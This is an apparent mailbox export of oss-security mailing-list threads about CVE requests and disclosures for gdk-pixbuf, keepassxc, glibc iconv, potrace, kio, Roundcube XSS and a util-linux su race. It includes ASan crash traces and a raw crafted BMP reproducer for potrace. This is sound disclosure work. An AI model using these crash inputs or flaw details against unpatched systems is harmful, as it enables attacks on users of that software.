> > I just reported several vulnerabilities in gdk-pixbuf. I am adding the
> > relevant details but you can also refer to the bug reports in the links.
> If
> > suitable please assign CVEs.
>
> As announced previously [0], MITRE is no longer assigning CVEs based on
> messages to this list. Will you request the CVE IDs via the new web
> form? [1]
>
> [0]
> http://seclists.org/oss-sec/2017/q1/351
>
> [1]
> https://cveform.mitre.org/
>



-- 
*Ariel Zelivansky *— 0503990401

```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488144005.28364_52.NdNdNx,U=7800:2,T -->

##### Ariel Zelivansky <ariel.zelivans@gmail.com>, `CAE-_4r1+bd+5utcah-_TEh3CiDWdj=030=COQjtg57GTx997pQ@mail.gmail.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
To keep all the information in one place, the following CVE IDs had been
assigned by MITRE:
CVE-2017-6313 for [1]
CVE-2017-6314 for [2]
CVE-2017-6312 for [3]
CVE-2017-6311 for [4]



On Thu, Feb 23, 2017 at 10:26 AM, Ariel Zelivansky <ariel.zelivans@gmail.com
> wrote:

> Leo, thanks for the reference.
>
> I have requested a CVE via the web form and haven't heard from MITRE so
> far. Do they usually take time in responding?
> Or am I supposed to contact some other CNA?
>
> On Tue, Feb 21, 2017 at 10:42 PM, Leo Famulari <leo@famulari.name> wrote:
>
>> On Tue, Feb 21, 2017 at 05:20:11PM +0200, Ariel Zelivanski wrote:
>> > Hello,
>> >
>> > I just reported several vulnerabilities in gdk-pixbuf. I am adding the
>> > relevant details but you can also refer to the bug reports in the
>> links. If
>> > suitable please assign CVEs.
>>
>> As announced previously [0], MITRE is no longer assigning CVEs based on
>> messages to this list. Will you request the CVE IDs via the new web
>> form? [1]
>>
>> [0]
>> http://seclists.org/oss-sec/2017/q1/351
>>
>> [1]
>> https://cveform.mitre.org/
>>
>
>
>
> --
> *Ariel Zelivansky *— 0503990401 <050-399-0401>
>

```

</details>

---

</details>

## keepassxc
<details>
<summary><strong>[oss-security] One byte stack buffer overflow in keepassxc / zxcvbn-c</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488717877.2210_48.Morbo,U=39139:2, -->

##### Hanno Böck <hanno@hboeck.de>, `20170304164823.3fb862c4@pc1`

```
Hi,

I recently reported a one byte buffer overflow in keepassxc [1] [2].
It's a pretty typical C bug: An array supposed to hold a string of a
certain size plus a trailing zero byte is one byte too small (i.e. the
size doesn't consider the trailing zero).
Given that the overflow happens right at the application's startup I
doubt it's exploitable in a meaningful way.
The bug was discovered simply by compiling with asan and running
keepassxc.

The code comes from zxcvbn-c (a checker for password quality), where
I've also reported it [3] (together with another minor bug regarding a
misuse of new [] / delete).

keepassxc is a fork of keepassx. However keepassx is not affected, as
it doesn't contain the zxcvbn password quality checking code.

One takeaway of this is that even amongst developers of security tools
the use of address sanitizer is still not a standard practice
everyone's using to test their C code.


[1] https://github.com/keepassxreboot/keepassxc/pull/363
[2] https://github.com/keepassxreboot/keepassxc/pull/365
[3] https://github.com/tsyrogit/zxcvbn-c/pull/11

-- 
Hanno Böck
https://hboeck.de/

mail/jabber: hanno@hboeck.de
GPG: FE73757FA60E4E21B937579FA5880072BBB51E42
```

</details>

## -c
<details>
<summary><strong>[oss-security] CVE-2016-10228: glibc iconv program can hang when invoked with the -c option</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488420512.7074_6.Morbo,U=38119:2, -->

##### Florian Weimer <fweimer@redhat.com>, `58d40b9e-35ab-6576-d190-774c869c2a58@redhat.com`

```
The iconv program (not the iconv function) provided by glibc can hang 
(enter an infinite loop) when invoked with the -c option and an invalid 
multi-byte sequence is encountered in the input:

   https://sourceware.org/bugzilla/show_bug.cgi?id=19519

We have received an independent report of this issue, so we are treating 
this as a (minor) security bug now on the glibc upstream side.

(Note to Red Hat Product Security: We already have a couple of product 
bugs for this.)

Thanks,
Florian

```

</details>

## potrace
<details>
<summary><strong>[oss-security] potrace: heap-based buffer overflow in bm_readbody_bmp (bitmap_io.c) (incomplete fix for CVE-2016-8698)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488550024.3737_82.Morbo,U=38526:2, -->

##### "Agostino Sarubbo" <ago@gentoo.org>, `244976.792574988-sendEmail@localhost`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
Description:
potrace is a utility that transforms bitmaps into vector graphics.

A fuzz on 1.14 showed that an overflow previously reported as CVE-2016-8698 was not really fixed. Since there isn’t a public git repository, I uploaded the patch on my ‘poc’ repository on github. The patch was sent from the 
upstream maintainer, Mr. Peter Selinger.

The complete ASan output:

# potrace $FILE
==7325==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x60200000efd0 at pc 0x00000051dc51 bp 0x7ffc766b1a30 sp 0x7ffc766b1a28
READ of size 8 at 0x60200000efd0 thread T0
    #0 0x51dc50 in bm_readbody_bmp /tmp/portage/media-gfx/potrace-1.14/work/potrace-1.14/src/bitmap_io.c:754:4
    #1 0x51dc50 in bm_read /tmp/portage/media-gfx/potrace-1.14/work/potrace-1.14/src/bitmap_io.c:138
    #2 0x510a45 in process_file /tmp/portage/media-gfx/potrace-1.14/work/potrace-1.14/src/main.c:1058:9
    #3 0x50dd56 in main /tmp/portage/media-gfx/potrace-1.14/work/potrace-1.14/src/main.c:1214:7
    #4 0x7f6c7333e78f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289
    #5 0x419b68 in getenv (/usr/bin/potrace+0x419b68)

0x60200000efd1 is located 0 bytes to the right of 1-byte region [0x60200000efd0,0x60200000efd1)
allocated by thread T0 here:
    #0 0x4d2b25 in calloc /tmp/portage/sys-devel/llvm-3.9.1-r1/work/llvm-3.9.1.src/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:72
    #1 0x519776 in bm_new /tmp/portage/media-gfx/potrace-1.14/work/potrace-1.14/src/bitmap.h:121:30
    #2 0x519776 in bm_readbody_bmp /tmp/portage/media-gfx/potrace-1.14/work/potrace-1.14/src/bitmap_io.c:574
    #3 0x519776 in bm_read /tmp/portage/media-gfx/potrace-1.14/work/potrace-1.14/src/bitmap_io.c:138
    #4 0x510a45 in process_file /tmp/portage/media-gfx/potrace-1.14/work/potrace-1.14/src/main.c:1058:9
    #5 0x50dd56 in main /tmp/portage/media-gfx/potrace-1.14/work/potrace-1.14/src/main.c:1214:7
    #6 0x7f6c7333e78f in __libc_start_main /tmp/portage/sys-libs/glibc-2.23-r3/work/glibc-2.23/csu/../csu/libc-start.c:289

SUMMARY: AddressSanitizer: heap-buffer-overflow /tmp/portage/media-gfx/potrace-1.14/work/potrace-1.14/src/bitmap_io.c:754:4 in bm_readbody_bmp
Shadow bytes around the buggy address:
  0x0c047fff9da0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9db0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9dc0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9dd0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9de0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0c047fff9df0: fa fa fa fa fa fa fa fa fa fa[01]fa fa fa 04 fa
  0x0c047fff9e00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9e10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9e20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9e30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0c047fff9e40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Heap right redzone:      fb
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack partial redzone:   f4
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==7325==ABORTING

Affected version:
1.14

Fixed version:
1.15

Commit fix:
https://github.com/asarubbo/poc/blob/master/00219-potrace-heapoverflow-bm_readbody_bmp-PATCH

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Reproducer:
https://github.com/asarubbo/poc/blob/master/00210-potrace-heapoverflow-bm_readbody_bmp

Timeline:
2017-02-26: bug discovered and reported to upstream
2017-02-28: upstream released a patch
2017-03-03: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2017/03/03/potrace-heap-based-buffer-overflow-in-bm_readbody_bmp-bitmap_io-c-incomplete-fix-for-cve-2016-8698

--
Agostino Sarubbo
Gentoo Linux Developer



```

</details>

---

</details>
<details>
<summary><strong>[oss-security] potrace: invalid memory access in findnext (decompose.c)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.Trash/cur/1478046927.4479_26463.NdNdNx,U=438:2,T -->

##### Agostino Sarubbo <ago@gentoo.org>, `4079765.cAzWC0Rqb2@arcadia`

```
Description:
potrace is a utility that transforms bitmaps into vector graphics.

A crafted image revealed, through a fuzz testing, the presence of a invalid 
memory access.

The complete ASan output:

# potrace $FILE
potrace: warning: 48.crashes: premature end of file                                                                                                                                            
ASAN:DEADLYSIGNAL                                                                                                                                                                              
=================================================================                                                                                                                              
==13940==ERROR: AddressSanitizer: SEGV on unknown address 0x7fd7b865b800 (pc 
0x7fd7ec5bcbf4 bp 0x7fff9ebad590 sp 0x7fff9ebad360 T0)                                                            
    #0 0x7fd7ec5bcbf3 in findnext /var/tmp/portage/media-
gfx/potrace-1.13/work/potrace-1.13/src/decompose.c:436:11                                                                             
    #1 0x7fd7ec5bcbf3 in getenv /var/tmp/portage/media-
gfx/potrace-1.13/work/potrace-1.13/src/decompose.c:478                                                                                  
    #2 0x7fd7ec5c3ed9 in potrace_trace /var/tmp/portage/media-
gfx/potrace-1.13/work/potrace-1.13/src/potracelib.c:76:7                                                                         
    #3 0x4fea6e in process_file /var/tmp/portage/media-
gfx/potrace-1.13/work/potrace-1.13/src/main.c:1102:10                                                                                   
    #4 0x4f872b in main /var/tmp/portage/media-
gfx/potrace-1.13/work/potrace-1.13/src/main.c:1250:7                                                                                            
    #5 0x7fd7eb4d961f in __libc_start_main /var/tmp/portage/sys-
libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289                                                                        
    #6 0x418fc8 in getenv (/usr/bin/potrace+0x418fc8)                                                                                                                                          
                                                                                                                                                                                               
AddressSanitizer can not provide additional info.                                                                                                                                              
SUMMARY: AddressSanitizer: SEGV /var/tmp/portage/media-
gfx/potrace-1.13/work/potrace-1.13/src/decompose.c:436:11 in findnext                                                                   
==13940==ABORTING
Affected version:
1.13

Fixed version:
N/A

Commit fix:
N/A

Credit:
This bug was discovered by Agostino Sarubbo of Gentoo.

CVE:
N/A

Timeline:
2016-08-26: bug discovered
2016-08-27: bug reported privately to upstream
2016-08-29: blog post about the issue

Note:
This bug was found with American Fuzzy Lop.

Permalink:
https://blogs.gentoo.org/ago/2016/08/29/potrace-invalid-memory-access-in-findnext-decompose-c/


```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.Trash/cur/1478046935.4479_26738.NdNdNx,U=713:2,T -->

##### cve-assign@mitre.org, `20161016025654.A45A96C0D67@smtpvmsrv1.mitre.org`

```
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

> https://blogs.gentoo.org/ago/2016/08/29/potrace-invalid-memory-access-in-findnext-decompose-c/

> SEGV on unknown address

> 0x7fd7ec5bcbf3 in findnext ... potrace-1.13/src/decompose.c:436:11
> 0x7fd7ec5bcbf3 in getenv ... potrace-1.13/src/decompose.c:478

Use CVE-2016-8685.

- -- 
CVE Assignment Team
M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
[ A PGP key is available for encrypted communications at
  http://cve.mitre.org/cve/request_id.html ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBCAAGBQJYAud1AAoJEHb/MwWLVhi2ScEP/3lo1mPD67U4CEoptEWB4GRo
yalqHOyd5Gs5X+D/lV2upZded+s3W2mRZ8ubu0S8bQdhkSbEHH4tX+ovPzV6LaAb
GNwYTSr1uCOGZCKRlN1HdU7NzQvjeAUi4w2JJBpV+XpTe21cEAopLH4w41Xwue4X
Wl3U5rF9dRVaqRng1LX56nC9bvHiVGe+DcbmpY46AosSIdTrXiBMi5KtHLgKTE6S
iYu5nTeIpK8DNsgDSPa9tqdsqxvihrF+xey5rPn02dHFumKJQOCis04VwOxgFtQG
8WGYob2bhXlxC1+AZcSox5BgIE5hS3MttouVmeqSviSSq1SO/QRF+Qu34iZZcCuI
573spEard0RIkqcY+RvVij8W2H6507P1fBZKLMjFxhDz4pR5hj6kjArRRL7X0LA8
WiS4wGK6l33mmUCwAzTfJTrmWlRO5qbJwaM7pGCo3d4BRwdmmq/sTv4Sov2txMxw
PFtj0FL44QAkuKEjcNp4lbLCF6XE3MB6cfeTnfjyya1evuSP5URD8SUHRB42Kjb5
FrCUOs2wYKVBOjtUabLKt9mrciBLqarEzXbbY1BWAqmOh8vBDyHGXLQL9oS4GT9E
BRhuq6CtPdH9+u5UKKSe3/TCQUcvmWNDowQcEqnnIgT7hxm+HGo/iz+9uIFj9ZgQ
kWGGXBvz+mQSlqdBJEW8
=odv0
-----END PGP SIGNATURE-----

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.Trash/cur/1478046936.4479_26761.NdNdNx,U=736:2,T -->

##### Johannes Segitz <jsegitz@suse.com>, `20161017085807.GH18601@suse.com`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
On Sat, Oct 08, 2016 at 10:29:54PM +0200, Agostino Sarubbo wrote:
> A crafted image revealed, through a fuzz testing, the presence of a invalid 
> memory access.

Thanks for the report. Can you please post the reproducer?

Johannes
-- 
GPG Key E7C81FA0       EE16 6BCE AD56 E034 BFB3  3ADD 7BF7 29D5 E7C8 1FA0
Subkey fingerprint:    250F 43F5 F7CE 6F1E 9C59  4F95 BC27 DD9D 2CC4 FD66
SUSE Linux GmbH, GF: Felix Imendörffer, Jane Smithard, Graham Norton
HRB 21284 (AG Nürnberg)

```

</details>
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNATURE-----

iQIcBAEBCgAGBQJYBJKfAAoJELwn3Z0sxP1mtTMP/2gJR96a3lFGkfGMo6smp+eN
6Ulzyf4oexuLrqF1M0xf9i5i7ggta9Ff/1B6cnS4XSsRnYWlAwBtTlrvQueXqwGw
Q4QEN8v623Bd1Ym9ciRIC5ZryDdhhoiqHiCWYIPYILwIo6TOw8et+j4g/Fhzr3Jh
WYyNcyjRcd4rDeylnC8TjyzYcJzjcRjV5z56sMYdXBR4JgK/uJMR4XtNtzjf9qDJ
Sij+Wo7pLR+NpYwdJpoo0PxIBjW8bboXw5GV3vhVyCACiOtmxCqd3JKYtpQCFY+9
Y8x3sqStGA5bu1emF8KGjU019MQMU40bfRh6GfAOjPwHIH2yzudUF3VCMfoA5qkC
cWYlMsDzOobxoBxp01wFVofydCdpxu/nx81Nyf9yqcHcamko4wcGIFPmsK8SO+7/
Gd5GZXLO/+03PbpGAot1kYKVf+QJ0j64qiSz+5IHy7oZbu+hNwX80/kGCAz611fG
08pl5Po6D37wiSyaIpykvaJyGG+HQ2Fp/amfcQzjN3ZfxOJEZ7+sgbNI2TXY0CPD
Cv3axs3bTQvIWuF13krO77kisfW60FVC+so0D30HucXgeUfLVLet+AeI32cuHdL4
iyroCTiQKieRqIJ9BI+xv1/Y1lrRK9xp9YjA3Rp7lsYKYD/shIE7pYmqGEuDJVt3
6RGBbb456EJwiMUzcV2v
=ZXmV
-----END PGP SIGNATURE-----


```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.Trash/cur/1478046936.4479_26760.NdNdNx,U=735:2,T -->

##### Agostino Sarubbo <ago@gentoo.org>, `1933473.yD5She0Zb5@blackgate`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
This is a multi-part message in MIME format.


```

</details>
<details><summary>Additional Parts</summary>

```
BM~       z   l   ÿÿÿ                    
   Ý              ÿ  ÿ  ÿ      ÿ                            
         èÿÿÿ 
```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488282778.6135_20.NdNdNx,U=7876:2,T -->

##### Agostino Sarubbo <ago@gentoo.org>, `1621585.jUp2hzoFSL@blackgate`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
On Saturday 08 October 2016 22:29:54 Agostino Sarubbo wrote:
> Permalink:
> https://blogs.gentoo.org/ago/2016/08/29/potrace-invalid-memory-access-in-fin
> dnext-decompose-c/

I'd like to notify that upstream released a patch here:
http://potrace.sourceforge.net/patches/potrace-1.13-CVE-2016-8685.patch

and it is fixed in the 1.14 release

-- 
Agostino Sarubbo
Gentoo Linux Developer


```

</details>

---

</details>

## kio
<details>
<summary><strong>[oss-security] kio vulnerability: need CVE</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379283.2379_150.Morbo,U=37989:2, -->

##### Albert Astals Cid <aacid@kde.org>, `1501907.mtIKE32cx4@xps`

```
Hi, Albert from KDE, can we get a CVE assigned for kio (input/output library)?

advisory is here https://www.kde.org/info/security/advisory-20170228-1.txt

Thanks,
  Albert

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1488379271.2379_85.Morbo,U=38111:2, -->

##### P J P <ppandit@redhat.com>, `alpine.LFD.2.20.1703011202510.1553@wniryva`

```
+-- On Tue, 28 Feb 2017, Albert Astals Cid wrote --+
| Hi, Albert from KDE, can we get a CVE assigned for kio (input/output library)?
| advisory is here https://www.kde.org/info/security/advisory-20170228-1.txt

Please see:
  -> http://cveform.mitre.org/

--
 - P J P
47AF CE69 3A90 54AA 9045 1053 DD13 3D32 FE5B 041F

```

</details>

## inside
<details>
<summary><strong>[oss-security] Roundcube: CVE-2017-6820: XSS issue in handling of a style tag inside of an svg element</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489336978.30987_1.Morbo,U=41290:2,S -->

##### Salvatore Bonaccorso <carnil@debian.org>, `20170312164149.4ivltlh32pglgfgm@eldamar.local`

```
Hi

I have requested a CVE for the following Roundcube issue, wich got
assigned CVE-2017-6820[*].

rcube_utils.php in Roundcube before 1.1.8 and before 1.2.4 is
susceptible to a cross-site scripting vulnerability via a crafted
Cascading Style Sheets (CSS) token sequence within an SVG element..

https://github.com/roundcube/roundcubemail/releases/tag/1.1.8
https://github.com/roundcube/roundcubemail/releases/tag/1.2.4
https://roundcube.net/news/2017/03/10/updates-1.2.4-and-1.1.8-released

Upstream fix (sequence of two commits):

https://github.com/roundcube/roundcubemail/commit/fa2824fdcd44af3f970b2797feb47652482c8305
https://github.com/roundcube/roundcubemail/commit/cbd35626f7db7855f3b5e2db00d28ecc1554e9f4

Regards,
Salvatore

 [*] ideally that would be done by the upstream project on it's own
 before publishing an issue in case it was privately reported, since
 it was not immediately clear to me if one was already requested or
 some other vendors/distributors have done it.

```

</details>

## util-linux
<details>
<summary><strong>[oss-security] util-linux 2.29.2 fixes CVE-2017-2616</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487850523.12837_2.NdNdNx,U=7659:2,T -->

##### Marcus Meissner <meissner@suse.de>, `20170223074630.GB26098@suse.de`

```
Hi,

util-linux 2.29.2 fixes CVE-2017-2616, a race condition which allowed local users
to kill other processes.

https://www.kernel.org/pub/linux/utils/util-linux/v2.29/v2.29.2-ReleaseNotes

"
  It is possible for any local user to send SIGKILL to other processes with root
  privileges.  To exploit this, the user must be able to perform su with a
  successful login.  SIGKILL can only be sent to processes which were executed
  after the su process.  It is not possible to send SIGKILL to processes which
  were already running.
"

Root cause of the flaw that a regular exit of the child process and the su ctrl-c kill of the
child PID could race and so you would be able to later started process with this specific PID.

The fix is here:
https://github.com/karelzak/util-linux/commit/dffab154d29a288aa171ff50263ecc8f2e14a891

Ciao, Marcus

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487850524.12837_5.NdNdNx,U=7662:2,T -->

##### Hanno Böck <hanno@hboeck.de>, `20170223104054.42060545@pc1`

```
Hi,

On Thu, 23 Feb 2017 08:46:30 +0100
Marcus Meissner <meissner@suse.de> wrote:

> util-linux 2.29.2 fixes CVE-2017-2616, a race condition which allowed
> local users to kill other processes.

I just reported this in Gentoo [1], yet I was informed that we're not
using su from util-linux, but from shadow. So depending on the
distribution you may not use this implementation of su.

I haven't digged deeper into this, can you say if this issue is
generic enough to be expected in other implementations as well? (Not
sure if the implementations of su in shadow and util-linux share a
common codebase, seems to be quite old stuff.)

[1] https://bugs.gentoo.org/show_bug.cgi?id=610664
-- 
Hanno Böck
https://hboeck.de/

mail/jabber: hanno@hboeck.de
GPG: FE73757FA60E4E21B937579FA5880072BBB51E42
```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487850524.12837_6.NdNdNx,U=7663:2,T -->

##### Marcus Meissner <meissner@suse.de>, `20170223100148.GA23394@suse.de`

```

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487856536.10498_9.NdNdNx,U=7680:2,T -->

##### Assaf Gordon <assafgordon@gmail.com>, `D7FFF88A-2AA9-432A-9830-0DF662E32524@gmail.com`

```
Hello,

> On Feb 23, 2017, at 05:01, Marcus Meissner <meissner@suse.de> wrote:
> 
> On Thu, Feb 23, 2017 at 10:40:54AM +0100, Hanno Böck wrote:
>> 
>>> util-linux 2.29.2 fixes CVE-2017-2616, a race condition which allowed
>>> local users to kill other processes.
> 
> coreutils uses the same su.c codebase, so it is also affected.
> 

GNU Coreutils stopped installing 'su' by default in 2007,
and completely removed 'su' (including the 'su.c' source file)
in 2012.

See:
https://git.savannah.gnu.org/cgit/coreutils.git/commit/?id=928dd737

regards,
 - assaf
```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487905393.10177_16.NdNdNx,U=7699:2,T -->

##### Hanno Böck <hanno@hboeck.de>, `20170223170848.17d43fb3@pc1`

```
On Thu, 23 Feb 2017 07:56:51 -0500
Assaf Gordon <assafgordon@gmail.com> wrote:

> GNU Coreutils stopped installing 'su' by default in 2007,
> and completely removed 'su' (including the 'su.c' source file)
> in 2012.

That's good to know, so now there are only 2 competing versions of su
instead of 3 in major packages :-)

Anyone have a good idea who is using shadow vs. util-linux su? Do they
have specific advantages/disadvantages, would it be reasonable to try
to get all distros to use them same one?

-- 
Hanno Böck
https://hboeck.de/

mail/jabber: hanno@hboeck.de
GPG: FE73757FA60E4E21B937579FA5880072BBB51E42
```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487905393.10177_23.NdNdNx,U=7706:2,T -->

##### Emilio Pozuelo Monfort <pochu@debian.org>, `89dcadc4-9895-a6e2-36ed-ac3195137978@debian.org`

```
On 23/02/17 17:08, Hanno Böck wrote:
> On Thu, 23 Feb 2017 07:56:51 -0500
> Assaf Gordon <assafgordon@gmail.com> wrote:
> 
>> GNU Coreutils stopped installing 'su' by default in 2007,
>> and completely removed 'su' (including the 'su.c' source file)
>> in 2012.
> 
> That's good to know, so now there are only 2 competing versions of su
> instead of 3 in major packages :-)
> 
> Anyone have a good idea who is using shadow vs. util-linux su?

Debian is using shadow's, fwiw.

Emilio

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487905393.10177_24.NdNdNx,U=7707:2,T -->

##### "Serge E. Hallyn" <serge@hallyn.com>, `20170223162028.GA14624@mail.hallyn.com`

```

```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487905393.10177_19.NdNdNx,U=7702:2,T -->

##### Bálint Réczey <balint@balintreczey.hu>, `CAK0OdpxiQO7Mt6TCSn-92D+nwnj3iJCwU4OTiuZ1=Kn5Rx_-xg@mail.gmail.com`

```
Hi,

2017-02-23 17:08 GMT+01:00 Hanno Böck <hanno@hboeck.de>:
> On Thu, 23 Feb 2017 07:56:51 -0500
> Assaf Gordon <assafgordon@gmail.com> wrote:
>
>> GNU Coreutils stopped installing 'su' by default in 2007,
>> and completely removed 'su' (including the 'su.c' source file)
>> in 2012.
>
> That's good to know, so now there are only 2 competing versions of su
> instead of 3 in major packages :-)
>
> Anyone have a good idea who is using shadow vs. util-linux su? Do they
> have specific advantages/disadvantages, would it be reasonable to try
> to get all distros to use them same one?

In Debian we are looking into switching to util-linux from shadow for
commands provided by both packages:
https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=833256

Cheers,
Balint
```

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487905393.10177_25.NdNdNx,U=7708:2,T -->

##### Leo Famulari <leo@famulari.name>, `20170223165139.GA11848@jasmine`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```
On Thu, Feb 23, 2017 at 05:08:48PM +0100, Hanno Böck wrote:
> Anyone have a good idea who is using shadow vs. util-linux su? Do they
> have specific advantages/disadvantages, would it be reasonable to try
> to get all distros to use them same one?

Debian uses shadow, but is discussing a switch to util-linux:
https://packages.debian.org/sid/login
https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=833256

GuixSD is using shadow:
https://git.savannah.gnu.org/cgit/guix.git/tree/gnu/system.scm#n579

I'm also interested to learn the pros and cons of the two
implementations.

```

</details>
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNATURE-----

iQIzBAABCAAdFiEEsFFZSPHn08G5gDigJkb6MLrKfwgFAlivExgACgkQJkb6MLrK
fwidNg/+PbdtVzcQgcYAIw3LLE6La+HPmIfWcRMja0QCEb47ruScq2AwKn2HNQQw
YTesr4NWzNhUs5esctwjXqlo5V9C5OtKJUN9So/S12qCjc7DN0g7e8fkSgTrqbU0
v1zT72/XVl1gIlS62ro0z9MNgsC9cy8zJUp/KVcllIE69u0Zk4ZuprJjbnZfhFG6
OYedkmUgnxZ8PfaUuxCGnwewI3WMpd19NcMWrfmXlcGkiAkPTB6d9t0GyHMBdjjM
QGoDj+lfzFdKmSpbGDdyMIpu/VHsdlVs18KAO9JzXMWe5YNJjv47ex3uAytB5VQ0
VScw957+/ptn6Qeru67JpuZLTZTh5/6Q2YToJSGyzbXqAWxzlz7OvYZhpgW14fON
EqDc06iGlogFwKBeR8UFEtPLWWNYF+JThMATbVrmJ5rq35rmaTZc4AVQ2PAyYaOh
e+SUMtvG7Mn1lkTntQrRenZ1oaQ/UTYvnveF5JkEWFg2duGapvp6pwu7dXgHE729
vk1qRN2lLjcnJe2kWghk/X0/IUpb0xMVm1C13OjCQipbIZeJjS5Nz/xcX5gDiErN
yp0AdmImHwkDTnqzk+2VIyafPgs8iPK9EOCE2GW8yqwJbprB3Xs1lsUIBvRgjkOF
9uWR94RvIJGXYJhwSPdhOfOFfoQqT3nkmesuXdKXdxMR5a5/NPA=
=ahFy
-----END PGP SIGNATURE-----


```

</details>

---

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1487905394.10177_30.NdNdNx,U=7713:2,T -->

##### Tobias Stöckmann <tobias@stoeckmann.org>, `a3beb7ec-c3e0-6506-cbbc-18a7f92eeca4@stoeckmann.org`

```

```

Additional Parts
<details><summary>Additional Parts</summary>

```

```

</details>
<details><summary>Additional Parts</summary>

```
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v2

iQIcBAEBCAAGBQJYryW0AAoJEH20cPNbC4sYSYUQALMTMIFkBwpaRP//n3kEkcic
HngrYo6wAsEwkjHorSNNzplqSAqySSCN1M3XwhfyjnFktDjrVwCOQZ5SzeK5lF2+
g3ZLarWxyKe9Q0waOSU0QW/N1KPDgM6BlIUbRZueuHX0BOQ6m1fn9HfPukqPkeOI
Xsw7DInUSTf5udtdkGYYMYyzq7w/8dzK66lMLKe2A4cS8WvQZK1RkDPXuGH2a4D0
Q0j8H+EspbxzbCcSPH+XQIVuTCUqa1z6ky8cvWyFu5VsW7nqVz9HWLeAWRAgrNPo
HB5WYA8f2H3pUVp9S5OCjBEu+0t3kmTca+xZpXeZ4lEW/3Ho3wIpOZYSTXuhOj3x
c/LMKCjIfaLBV9xjZt4fpB3NmenfNPs9Fs2jlmI78QqqEv8FQPMNs/VbnHnzlRqW
W42Iyvquov6lUh7qajal0qoH1isNO/JFyCq94ZrhARX2M2kcS4CUhFUl5Pt9W39D
fBsi1/PPnNDuVGfflBXarzV5PJrJFk0Njw76u0LWSqJaJZxuZGn/uU+CFVgjFJhL
E16M37Wwcpe0Odh+m4v4oOREpmOEfl/bDLaIH23Nb+ZmK3UvPf8zJQjlLnQe9A/C
UXXqrKca1vtvDaxLeI2KdOguc5/pJ+xRvogluZkOg/AY51nnVjyHyH+iu10gyXAp
+bF6GsSLV23YGxCt+06P
=rIX4
-----END PGP SIGNATURE-----


```

</details>

---

</details>

## irssi
<details>
<summary><strong>[oss-security] CVE Request: Irssi use after free in netjoin condition (2017/03)</strong></summary>

<!-- next: /home/grahamc/.mail/grahamc/[Gmail]/.All Mail/cur/1489331687.26232_50.Morbo,U=40925:2,T -->

